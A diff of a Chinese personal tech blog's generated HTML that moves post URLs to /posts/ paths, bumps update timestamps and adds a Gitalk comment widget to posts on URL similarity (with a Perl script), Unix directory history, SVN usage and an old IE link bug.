+            <a href="/posts/url-e7-9b-b8-e4-bc-bc-e5-ba-a6-e8-ae-a1-e7-ae-97-e7-9a-84-e6-80-9d-e8-80-83-2/" class="post-title-link" itemprop="url">URL相似度计算的思考</a>
         </h2>
 
         <div class="post-meta">
@@ -589,7 +766,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -623,6 +800,15 @@
           <p>在做一些web相关的工作的时候，我们往往可能需要做一些对url的处理，其中包括对相似的url的识别和处理。这就需要计算两个url的相似度。 那么怎么进行url相似度的计算的？我首先想到的是把一个url看作是一个字符串，这样就简化成两个字符串相似度的计算。字符串相似度计算有很多已经比较成熟的算法，比如“<a href="http://en.wikipedia.org/wiki/Levenshtein_Distance" target="_blank" rel="noopener">编辑距离算法</a>”，该算法描述了两个字符串之间转换需要的最小的编辑次数；还有一些其他的比如“<a href="http://www.cnblogs.com/dartagnan/archive/2011/10/06/2199764.html" target="_blank" rel="noopener">最长公共字串</a>”等方法。但这些方法对于url相似度的计算来说是不是够了呢？比如给以下三个url： url1: <a href="http://www.spongeliu.com/xxx/123.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/123.html</a> url2: <a href="http://www.spongeliu.com/xxx/456.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/456.html</a> url3: <a href="http://www.spongeliu.com/xxx/abc.html" target="_blank" rel="noopener">www.spongeliu.com/xxx/abc.html</a> 这三个url的编辑距离是一致的，但是直观上我们却认为url1和url2更加相似一些。 再比如我们要判断两个站点是否同一套建站模版建立的，抽出两个url如下这样： url1: <a href="http://www.163.com/go/artical/43432.html" target="_blank" rel="noopener">www.163.com/go/artical/43432.html</a> url2: <a href="http://www.sina.com.cn/go/artical/453109.html" target="_blank" rel="noopener">www.sina.com.cn/go/artical/453109.html</a> 这两个url按照情景应该是相似的，这就超出了字符串相似度判断的能力范围。 重新回到问题，要判断的是两个url的相似度，但是字符串的判断方法又不能很好应用。那么url和字符串的区别在哪里？这取决于如何定义相似的url。可以注意到，url比字符串含有更多的信息可以参考，因为url本身是包含<strong>结构和特征</strong>的，比如站点、目录。定义相似url的时候，是否要考虑站点？是否要考虑目录的一致？是否要考虑目录的深度？这取决于具体的需求。 考虑到url本身的结构，对其相似度的计算就可以抽象为对其关键特征相似度的计算。比如可以把站点抽象为一维特征，目录深度抽象为一维特征，一级目录、二级目录、尾部页面的名字也都可以抽象为一维特征。比如下面两个url: url1:  <a href="http://www.spongeliu.com/go/happy/1234.html" target="_blank" rel="noopener">http://www.spongeliu.com/go/happy/1234.html</a> url2:  <a href="http://www.spongeliu.com/snoopy/tree/abcd.html" target="_blank" rel="noopener">http://www.spongeliu.com/snoopy/tree/abcd.html</a> 先不定义他们是否相似，先来抽象一下他们的特征： 1、站点特征：如果两个url站点一样，则特征取值1，否则取值0； 2、目录深度特征：特征取值分别是两个url的目录深度是否一致； 3、一级目录特征：在这维特征的取值上，可以采用多种方法，比如如果一级目录名字相同则特征取1，否则取0；或者根据目录名字的编辑距离算出一个特征值； 或者根据目录名字的pattern，如是否数字、是否字母、是否字母数字穿插等。这取决于具体需求，这里示例仅仅根据目录名是否相同取1和0； 4、尾页面特征：这维特征的取值同一级目录，可以判断后缀是否相同、是否数字页、是否机器生成的随机字符串或者根据编辑长度来取值，具体也依赖于需求。这里示例仅仅判断最后一级目录的特征是否一致（比如是否都由数字组成、是否都有字母组成等）。 这样，对于这两个url就获得了4个维度的特征，分别是：1 1 0 0 。 有了这两个特征组合，就可以根据具体需求判断是否相似了。我们定义一下每个特征的重要程度，给出一个公式： similarity = feather1 * x1 + feather2*x2 + feather3*x3 + feather4*x4; 其 中x表示对应特征的重要程度，比如我认为站点和目录都不重要，最后尾页面的特征才是最重要的，那么x1,x2,x3都可以取值为0，x4取值为 1，这样根据similarity就能得出是否相似了。或者认为站点的重要性占10%，目录深度占50%，尾页面的特征占40%，那么系数分别取值为 0.1\0.5\0\0.4即可。 其实这样找出需要的特征，可以把这个问题简化成一个机器学习的问题，只需要人为判断出一批url是否相似，用svm训练一下就可以达到机器判断的目的。 除了上面这种两个url相似度的判断，也可以将每一条url都抽象成一组特征，然后计算出一个url的得分，设置一个分数差的阈值，就可以达到从一大堆url中找出相似的url的目的。   下面的代码是perl编写的抽象两个url特征的脚本，这只是一个测试的脚本，难免有bug和丑陋的地方，仅供参考：</p>
 <p>#!/usr/bin/perl<br>use strict;<br>use warnings;<br>my $url1 = $ARGV[0];<br>my $url2 = $ARGV[1];<br>my @array1 = split( /\//, $url1 );<br>my @array2 = split( /\//, $url2 );<br>#特征1：目录数<br>my $path1 = @array1;<br>my $path2 = @array2;<br>#print $path1, $path2;<br>#特征2：是否目录结尾<br>my $lastispath1 = 0;<br>my $lastispath2 = 0;<br>if( $url1 =~ /\/$/ )<br>{<br>    $lastispath1 = 1;<br>}<br>if( $url1 =~ /\/$/ )<br>{<br>    $lastispath2 = 1;<br>}<br>#特征3：最后一级是否有后缀(htm,html,shtml等)<br>my $len;<br>my $hassuffix1 = 0;<br>my $hassuffix2 = 0;<br>my $suffixstr;<br>my $laststr1 = $array1[$path1 - 1];<br>my $laststr2 = $array2[$path2 - 1];<br>my $issuffixsame = 0;<br>if( $lastispath1 == 0 )<br>{<br>    my @suffix1 = split( /\./, $array1[$path1 - 1]);<br>    if( @suffix1 &gt;= 2 )<br>    {<br>        $len = rindex( $suffix1[@suffix1 - 1].”\$”, “\$”);<br>        if( $len &lt;= 5 )<br>        {<br>            $hassuffix1 = 1;<br>            $suffixstr = $suffix1[@suffix1 - 1];<br>            my $tmplen = rindex( $array1[@array1 - 1].”\$”, “\$”);<br>            $laststr1 = substr( $array1[@array1 - 1], 0, $tmplen-$len-1 );<br>        }<br>    }<br>}<br>if( $lastispath2 == 0 )<br>{<br>    my @suffix2 = split( /\./, $array2[$path2 - 1]);<br>    if( @suffix2 &gt;= 2 )<br>    {<br>        $len = rindex( $suffix2[@suffix2 - 1].”\$”, “\$”);<br>        if( $len &lt;= 5 )<br>        {<br>            $hassuffix2 = 1;<br>            if($suffixstr eq $suffix2[@suffix2 - 1])<br>            {<br>                $issuffixsame = 1;<br>            }<br>            my $tmplen = rindex( $array2[@array2 - 1].”\$”, “\$”);<br>            $laststr2 = substr( $array2[@array2 - 1], 0, $tmplen-$len-1 );<br>        }<br>    }<br>}<br>#特征3：最后一级几个分隔符(通过特征匹配计算laststr1和laststr2相似度，如果仅计算字符串相似度，可以用编辑长度)<br>my @area1 = split(/-/, $laststr1);<br>my @area2 = split(/-/, $laststr2);<br>my $i;<br>my $j;<br>my $totalarea1=0;<br>my $totalarea2=0;<br>my @patternarray1={0};<br>my @patternarray2={0};<br>my @splitarray1={0};<br>my @splitarray2={0};<br>#my $numarea1 = @area2;<br>#print $laststr1,” “,$laststr2,”\n”,$numarea1,”\n”;<br>for ( $i = 1; $i&lt;=@area1; $i++ )<br>{<br>    my @tmp1 = split( /<em>/, $area1[$i-1]);<br>    for( $j = 0; $j&lt;@tmp1; $j++)<br>    {<br>        if( $tmp1[$j] =~ /^\d+$/ )<br>        {<br>            $patternarray1[$totalarea1] = 1; #数字pattern<br>        }<br>        elsif( $tmp1[$j] =~ /^[a-zA-Z]+$/)<br>        {<br>            $patternarray1[$totalarea1] = 2; #纯字母pattern<br>        }<br>        elsif( $tmp1[$j] =~ /^[a-zA-Z]+[0-9]+$/)<br>        {<br>            $patternarray1[$totalarea1] = 3; #先字母后数字pattern<br>        }<br>        elsif( $tmp1[$j] =~ /^[0-9]+[a-zA-Z]+$/)<br>        {<br>            $patternarray1[$totalarea1] = 4; #先数字后字母pattern<br>        }<br>        else<br>        {<br>            $patternarray1[$totalarea1] = 5; #其他pattern<br>        }<br>        if( $j == 0 )<br>        {<br>            $splitarray1[$totalarea1]=1;<br>        }<br>        else<br>        {<br>            $splitarray1[$totalarea1]=2;<br>        }<br>        $totalarea1 ++;<br>    }<br>}<br>for ( $i = 1; $i&lt;=@area2; $i++ )<br>{<br>    my @tmp2 = split( /</em>/, $area2[$i-1]);<br>    for( $j = 0; $j&lt;@tmp2; $j++)<br>    {<br>        if( $tmp2[$j] =~ /^\d+$/ )<br>        {<br>            $patternarray2[$totalarea2] = 1; #数字pattern<br>        }<br>        elsif( $tmp2[$j] =~ /^[a-zA-Z]+$/)<br>        {<br>            $patternarray2[$totalarea2] = 2; #纯字母pattern<br>        }<br>        elsif( $tmp2[$j] =~ /^[a-zA-Z]+[0-9]+$/)<br>        {<br>            $patternarray2[$totalarea2] = 3; #先字母后数字pattern<br>        }<br>        elsif( $tmp2[$j] =~ /^[0-9]+[a-zA-Z]+$/)<br>        {<br>            $patternarray2[$totalarea2] = 4; #先数字后字母pattern<br>        }<br>        else<br>        {<br>            $patternarray2[$totalarea2] = 5; #其他pattern<br>        }<br>        if( $j == 0 )<br>        {<br>            $splitarray2[$totalarea2]=1;<br>        }<br>        else<br>        {<br>            $splitarray2[$totalarea2]=2;<br>        }<br>        $totalarea2 ++;<br>    }<br>}<br>print $path1,” “,$lastispath1,” “,$hassuffix1,” “,$issuffixsame,” “,$totalarea1;<br>for( $i = 0; $i&lt;$totalarea1; $i++)<br>{<br>    print “ “,$splitarray1[$i],” “,$patternarray1[$i];<br>}<br>print “\n”;<br>print $path2,” “,$lastispath2,” “,$hassuffix1,” “,$issuffixsame,” “,$totalarea2;<br>for( $i = 0; $i&lt;$totalarea2; $i++)<br>{<br>    print “ “,$splitarray2[$i],” “,$patternarray2[$i];<br>}<br>print “\n”;<br>#print @array1;</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -641,7 +827,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/07/14/unix-e7-9b-ae-e5-bd-95-e7-bb-93-e6-9e-84-e7-9a-84-e6-9d-a5-e5-8e-86/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/unix-e7-9b-ae-e5-bd-95-e7-bb-93-e6-9e-84-e7-9a-84-e6-9d-a5-e5-8e-86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -655,7 +841,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/07/14/unix-e7-9b-ae-e5-bd-95-e7-bb-93-e6-9e-84-e7-9a-84-e6-9d-a5-e5-8e-86/" class="post-title-link" itemprop="url">Unix目录结构的来历</a>
+            <a href="/posts/unix-e7-9b-ae-e5-bd-95-e7-bb-93-e6-9e-84-e7-9a-84-e6-9d-a5-e5-8e-86/" class="post-title-link" itemprop="url">Unix目录结构的来历</a>
         </h2>
 
         <div class="post-meta">
@@ -672,7 +858,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -699,6 +885,15 @@
       
           <p>Unix（包含Linux）的初学者，常常会很困惑，不明白目录结构的含义何在。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" alt="bg2012020601"></a> 举例来说，根目录下面有一个子目录/bin，用于存放二进制程序。但是，/usr子目录下面还有/usr/bin，以及/usr/local/bin，也用于存放二进制程序；某些系统甚至还有/opt/bin。它们有何区别？ 长久以来，我也感到很费解，不明白为什么这样设计。像大多数人一样，我只是根据<a href="http://www.pathname.com/fhs/pub/fhs-2.3.html" target="_blank" rel="noopener">《Unix文件系统结构标准》</a>（Filesystem Hierarchy Standard），死记硬背不同目录的区别。 昨天，我读到了Rob Landley的<a href="http://lists.busybox.net/pipermail/busybox/2010-December/074114.html" target="_blank" rel="noopener">简短解释</a>，这才恍然大悟，原来Unix目录结构是历史造成的。 话说1969年，<a href="http://www.ruanyifeng.com/blog/2009/06/unix_turns_40.html" target="_blank" rel="noopener">Ken Thompson</a>和<a href="http://www.ruanyifeng.com/blog/2011/10/dennis_ritchie.html" target="_blank" rel="noopener">Dennis Ritchie</a>在小型机PDP-7上发明了Unix。1971年，他们将主机升级到了PDP-11。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" alt="bg2012020602"></a>当时，他们使用一种叫做RK05的储存盘，一盘的容量大约是1.5MB。 <a href="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" alt="bg2012020603"></a> 没过多久，操作系统（根目录）变得越来越大，一块盘已经装不下了。于是，他们加上了第二盘RK05，并且规定第一块盘专门放系统程序，第二块盘专门 放用户自己的程序，因此挂载的目录点取名为/usr。也就是说，根目录”/“挂载在第一块盘，”/usr”目录挂载在第二块盘。除此之外，两块盘的目录结 构完全相同，第一块盘的目录（/bin, /sbin, /lib, /tmp…）都在/usr目录下重新出现一次。 后来，第二块盘也满了，他们只好又加了第三盘RK05，挂载的目录点取名为/home，并且规定/usr用于存放用户的程序，/home用于存放用户的数据。 从此，这种目录结构就延续了下来。随着硬盘容量越来越大，各个目录的含义进一步得到明确。 <strong>/</strong>：存放系统程序，也就是At&amp;t开发的Unix程序。 <strong>/usr</strong>：存放Unix系统商（比如IBM和HP）开发的程序。 <strong>/usr/local</strong>：存放用户自己安装的程序。 <strong>/opt</strong>：在某些系统，用于存放第三方厂商开发的程序，所以取名为option，意为”选装”。 （完）</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -717,7 +912,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/07/13/svn-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/svn-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -731,7 +926,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/07/13/svn-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/" class="post-title-link" itemprop="url">SVN使用方法</a>
+            <a href="/posts/svn-e4-bd-bf-e7-94-a8-e6-96-b9-e6-b3-95/" class="post-title-link" itemprop="url">SVN使用方法</a>
         </h2>
 
         <div class="post-meta">
@@ -748,7 +943,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -775,6 +970,15 @@
       
           <p><strong>问题一：Revert changes from this revision 跟Revert to this</strong> 譬如有个文件，有十个版本，假定版本号是1，2，3，4，5，6，7，8，9，10。 (1)Revert to this revision： 如果是在版本6这里点击“Revert to this revision”，表示7～10的修改全部作废，历史倒退到了版本6那个年代。 (2)Revert changes from this revision：如果是在版本6这里点击“Revert changes from this revision”，表示版本6这个历史事件被抹杀了，只剩下除版本6外的9个历史事件了。 如果俺是同时选择了6，7，8三个历史时期并点击“Revert changes from this revision”，表示抹杀6~8这仨历史时期。 同理，如果同时选择7～10，然后点击“Revert changes from this revision”，则效果跟在版本6这里点击“Revert to this revision”是一样的。 TortoiseSVN是windows下其中一个非常优秀的SVN客户端工具。通过使用它，我们可以可视化的管理我们的版本库。不过由于它只是一个客户端，所以它不能对版本库进行权限管理。 TortoiseSVN不是一个独立的窗口程序，而是集成在windows右键菜单中，使用起来比较方便。 01、SVN Checkout(SVN取出) 点击SVN Checkout，弹出检出提示框，在URL of repository输入框中输入服务器仓库地址，在Checkout directory输入框中输入本地工作拷贝的路径，点击确定，即可检出服务器上的配置库。 02、SVN Update(SVN更新) 如果配置库在本地已有工作拷贝，则取得最新版本只是执行SVN Update即可，点击SVN Update，系统弹出更新提示框，点击确定，则把服务器是最新版本更新下来 03、Import（导入） 选择要提交到服务器的目录，右键选择TortoiseSVN—-Import，系统弹出导入提示框，在URL of repository输入框中输入服务器仓库地址，在Import Message输入框中输入导入日志信息，点击确定，则文件导入到服务器仓库中。 04、Add(加入) 如果有多个文件及文件夹要提交到服务器，我们可以先把这些要提交的文件加入到提交列表中，要执行提交操作，一次性把所有文件提交，如图，可以选择要提交的文件，然后点击执行提交（SVN Commit）,即可把所有文件一次性提交到服务器上 05、Resolving Conflicts(解决冲突) 有时你从档案库更新文件会有冲突。冲突产生于两人都修改文件的某一部分。解决冲突只能靠人而不是机器。当产生冲突时，你应该打开冲突的文件，查找以&lt;&lt;&lt;&lt;&lt;&lt;&lt;开始的行。冲突部分被标记： &lt;&lt;&lt;&lt;&lt;&lt;&lt; filename your changes ======= code merged from repository &gt;&gt;&gt;&gt;&gt;&gt;&gt; revision Subversion为每个冲突文件产生三个附加文件： filename.ext.mine 更新前的本地文件。 filename.ext.rOLDREV 你作改动的基础版本。 filename.ext.rNEWREV 更新时从档案库得到的最新版本。 使 用快捷菜单的编辑冲突Edit Conflict命令来解决冲突。然后从快捷菜单中执行已解决Resolved命令，将改动送交到档案库。请注意，解决命令并不解决冲突，而仅仅是删除 filename.ext.mineandfilename.ext.r<em>文件并允许你送交。 06、Check for Modifications（检查更新） 点击Check for Modifications,系统列表所以待更新的文件及文件夹的状态. 07、Revision Graph(版本分支图) 查看文件的分支,版本结构,可以点击Revision Graph,系统以图形化形式显示版本分支. 08、Rename(改名) SVN支持文件改名,点击Rename,弹出文件名称输入框,输入新的文件名称,点击确定,再把修改提交,即可完成文件改名 09、Delete(删除) SVN支持文件删除,而且操作简单,方便,选择要删除的文件,点击Delete,再把删除操作提交到服务器 10、Moving(移动) 选择待移动的文件和文件夹；按住右键拖动right-drag文件（夹）到跟踪拷贝内的新地方；松开左键；在弹出菜单中选择move files in Subversion to here 11、Revert(还原) 还原操作,如刚才对文件做了删除操作,现在把它还原回来,点击删除后,再点击提交,会出现如上的提示框,点击删除后,再点击Revert,即已撤销删除操作,如果这时候点击提交,则系统弹出提示框:没有文件被修改或增加,不能提交 12、Branch/Tag(分支/标记) 当需要创建分支，点击Branch/Tag，在弹出的提示框中，输入分支文件名，输入日志信息，点击确定，分支创建成功，然后可查看文件的版本分支情况 13、Switch(切换) 文件创建分支后，你可以选择在主干工作，还是在分支工作，这时候你可以通过Switch来切换。 14、Merge(合并) 主干和分支的版本进行合并，在源和目的各输入文件的路径，版本号，点击确定。系统即对文件进行合并，如果存在冲突，请参考冲突解决。 15、Export(导出) 把整个工作拷贝导出到本地目录下,导出的文件将不带svn文件标志,文件及文件夹没有绿色的”√”符号标志。 16、Relocate(重新定位) 当服务器上的文件库目录已经改变，我们可以把工作拷贝重新定位，在To URL输入框中输入新的地址 17、Add to Ignore List(添加到忽略列表) 大多数项目会有一些文件（夹）不需要版本控制，如编译产生的</em>.obj, *.lst,等。每次送交，TortoiseSVN提示那些文件不需要控制，挺烦的。这时候可以把这些文件加入忽略列表。 18、SVN其它相关功能 客户端修改用户密码: 打开浏览器,在地址栏内输入<a href="http://192.168.1.250/cgi-bin/ChangePasswd" target="_blank" rel="noopener">http://192.168.1.250/cgi-bin/ChangePasswd</a>,启动客户端修改用户密码的界面,输入正确的用户名,旧密码,新密码(注意密码的位数应该不小于6,尽量使用安全的密码),点击修改即可. 19、SVN Commit（版本提交） 把自己工作拷贝所做的修改提交到版本库中，这样别人在获取最新版本(Update)的时候就可以看到你的修改了。 20、Show log（显示日志） 显示当前文件(夹)的所有修改历史。SVN支持文件以及文件夹独立的版本追溯。 21、Repo-Browser（查看当前版本库） 查看当前版本库，这是TortoiseSVN查看版本库的入口，通过这个菜单项，我们就可以进入配置库的资源管理器，然后就可以对配置库的文件夹进行各种管理，相当于我们打开我的电脑进行文件管理一样。 22、Revision Graph（版本图形） 查看当前项目或文件的修订历史图示。如果项目比较大型的话，一般会建多个分支，并且多个里程碑（稳定版本发布），通过这里，我们就可以看到项目的全貌。 23、Resolved（解决冲突） 如果当前工作拷贝和版本库上的有冲突，不能自动合并到一起，那么当你提交修改的时 候，tortoisesvn就会提示你存在冲突，这时候你就可以通过这个菜单项来解决冲突。冲突的解决有两种，一种是保留某一份拷贝，例如使用配置库覆盖 当前工作拷贝，或者反过来。还有一种是手动解决冲突，对于文本文件，可以使用tortoiseSVN自带的工具，它会列出存在冲突的地方，然后你就可以和 提交者讨论怎么解决这个冲突。同时它也对Word有很好的支持 24、Update to Revision(更新至版本) 从版本库中获取某一个历史版本。这个功能主要是方便查看历史版本用，而 不是回滚版本。注意：获取下来之后，对这个文件不建议进行任何操作。如果你做了修改，那么当你提交的时候SVN会提示你，当前版本已失效（即不是最新版 本），无法提交，需要先update一下。这样你所做的修改也就白费了。 25、Revert（回滚） 如果你对工作拷贝做了一些修改，但是你又不想要了，那么你可以使用这个选项把所做的修改撤销 26、Cleanup（清除状态） 如果当前工作拷贝有任何问题的话，可以使用这个选项进行修正。例如，有些文件原来是版本控制的， 但是你没有通过tortoiseSVN就直接删除了，但是tortoiseSVN还是保留着原来的信息（每个文件夹下都有一个.svn的隐藏文件夹，存放 着当前文件夹下所有文件夹的版本信息）所以这就会产生一些冲突。可以使用cleanup来清理一下。 27、GetLock/ReleaseLock（加锁/解锁） 如果你不想别人修改某个文件的话，那么你就可以把这个文件进行加锁，这样可以保证只有你对这个文件有修改权。除非你释放了锁，否则别人不可能提交任何修改到配置库中 28、Branch/tag（分支/标签） Branch是分支的意思。例如当在设计一个东西的时候，不同的人有不同的实现，但是没有经过实践检验，谁也不想直接覆盖掉其他人的设计，所以可以引出不同的分支。将来如果需要，可以将这些分支进行合并。 tag是打标签的意思。通常当项目开发到一定程度，已经可以稳定运行的时候，可以对其打上一个标签，作为稳定版。将来可以方便的找到某个特定的版本（当然我们也可以使用版本号来查找，但是数字毕竟不方便） SVN对于分支和标签都是采用类似Linux下硬链接的方式（同一个文件可以存在两个地方，删除一个不会影响另一个，所做修改会影响另一个），来管理文件的，而不是简单的复制一份文件的拷贝，所以不会有浪费存储空间的问题存在。 29、Export（导出） 这个功能是方便我们部署用。当我们需要发布一个稳定版本时，就可以使用这个功能将整个工程导出到某个文件夹，新的文件夹将不会包含任何版本信息了。 30、Relocate（版本库转移） 当我们版本库发生转移的时候就需要用到这个功能了。例如我原先的版本库是建在U盘上的，现在转移到（复制整个配置库文件夹）开发服务器上，使用https代替文件系统的访问。因此就需要将原来的工作拷贝的目标版本库重新定位到开发服务器上。 31、create patch（创建补丁） 创建补丁。如果管理员不想让任何人都随便提交修改，而是都要经过审核才能做出修改，那么其他人就可以通过创建补丁的方式，把修改信息（补丁文件）发送给管理员，管理员审核通过之后就可以使用apply patch提交这次修改了。 32、diff (比较修改部分) 如果你修改了一个文件，又不确定改了那些地方，这时你可以在相应文件上点右键，选择diff查看，与服务器上最新版的差异</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
+		var gitalkConfig = {"clientID":"8fffdd9e888794e7cafb","clientSecret":{"gitalk-github-client-secret":null},"repo":"veitor.github.io","owner":"Veitor","admin":["Veitor"],"distractionFreeMode":false};
+	    gitalkConfig.id = md5(location.pathname);
+		var gitalk = new Gitalk(gitalkConfig);
+	    gitalk.render("gitalk-container");
+	    </script>
       
     </div>
 
@@ -793,7 +997,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/2014/06/25/ie678-e4-b8-8b-e9-93-be-e6-8e-a5-e5-9b-be-e7-89-87-e7-82-b9-e4-b8-8d-e4-b8-ad-e9-97-ae-e9-a2-98-e8-ae-a8-e8-ae-ba/">
+    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/ie678-e4-b8-8b-e9-93-be-e6-8e-a5-e5-9b-be-e7-89-87-e7-82-b9-e4-b8-8d-e4-b8-ad-e9-97-ae-e9-a2-98-e8-ae-a8-e8-ae-ba/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/avatar.jpg">
@@ -807,7 +1011,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2014/06/25/ie678-e4-b8-8b-e9-93-be-e6-8e-a5-e5-9b-be-e7-89-87-e7-82-b9-e4-b8-8d-e4-b8-ad-e9-97-ae-e9-a2-98-e8-ae-a8-e8-ae-ba/" class="post-title-link" itemprop="url">IE678下链接图片点不中问题讨论</a>
+            <a href="/posts/ie678-e4-b8-8b-e9-93-be-e6-8e-a5-e5-9b-be-e7-89-87-e7-82-b9-e4-b8-8d-e4-b8-ad-e9-97-ae-e9-a2-98-e8-ae-a8-e8-ae-ba/" class="post-title-link" itemprop="url">IE678下链接图片点不中问题讨论</a>
         </h2>
 
         <div class="post-meta">
@@ -824,7 +1028,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-03 22:56:03" itemprop="dateModified" datetime="2019-12-03T22:56:03+08:00">2019-12-03</time>
+                <time title="修改时间：2019-12-04 22:46:27" itemprop="dateModified" datetime="2019-12-04T22:46:27+08:00">2019-12-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -851,6 +1055,15 @@
       
           <p><a href="http://storage.veitor.net/uploads/2014/06/QQ截图20140626150002.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/06/QQ%E6%88%AA%E5%9B%BE20140626150002.jpg" alt="QQ截图20140626150002"></a>因为今天制作的房产项目中出现了图片链接无法点击问题，重新审视了一下块集元素和内联元素，不是混淆，而是重新想了一下新的东西，有时候在我们进行重构的时候，偶尔会为了实际需要而将内联元素强制显示为块集元素，在一般情况下，这个是不会出问题的，而且可以很轻松的通过标准，但是在某一些情况下，虽然验证工具可以放过我们，但是在ie678下面会出现解析不正确的问题，下面就简单跟大家分享一下这个问题。 有时候由于需要文字和图片同时获取到点击态，或者需要实现一些高难度的效果，就需要多标签来写结构，可能的结构会如下所示： <div class="block"> <a href="http://www.hualongxiang.com" target="_blank" rel="noopener"><span><img src="http://static.hualongxiang.com/logo/logo.jpg" alt="hlx" /></span></a> </div> 在没有被赋予强大的CSS的时候，是可以正常点击的，但是当赋予需要的CSS的时候，在ie8一下就会出现图片区域点击不到的情况： .block span{float:left;} 如果将span标签块集化： .block span{float:left;dispaly:block;width:100px;height:100px;} 最终的结果依然不是不能点击到，但是图片区域以为的内容确可以正常点击。 而对于此，我的理解是这样的： 因为a标签本身就是一个内联元素标签，内联标签内正常情况只允许放置内联元素，放置块集元素本身语法就有问题，虽然表面上放置的span标签，但是我们又将其强制块集化，在某些浏览器下还是会解析错误，比如说ie6/7，所以这里针对链接的这种情况，出现的问题就是图片区域无法点击。 针对这种问题的解决方法： 保证在a标签中不要放置块集元素，或者强制块集元素，如果需要解决一些特殊效果，可以采取将这个强制元素跟a内置的img标签同级放置，这样也可以避免图片点击不到问题。</p>
 
+<div id="gitalk-container"></div>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+		<script>
